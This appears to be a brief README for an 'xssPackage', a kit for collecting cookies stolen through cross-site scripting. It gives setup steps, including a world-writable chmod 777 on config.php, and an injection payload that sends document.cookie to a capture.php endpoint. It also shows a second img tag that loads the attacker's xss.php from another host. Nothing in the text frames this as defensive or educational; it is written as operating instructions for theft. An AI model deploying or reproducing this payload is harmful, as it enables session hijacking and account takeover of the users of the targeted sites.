####################################
# File created by @joshingeneral   #
# part of the xssPackage           #
# date 07/01/2013                  #
# Simple Instructions	           #
####################################
All you need to do to set this up is:
1. chmod 777 config.php
2. Browse to install and enter database details as needed
3. Direct all xss to the site in the form of:

    	<img src='capture.php?cookie=' + escape(document.cookie);></img>

   (see xss.php, xss1.php or xss2.php for examples) 
   You could also do 

	<img src=example.com/xssPackage/xss.php> 
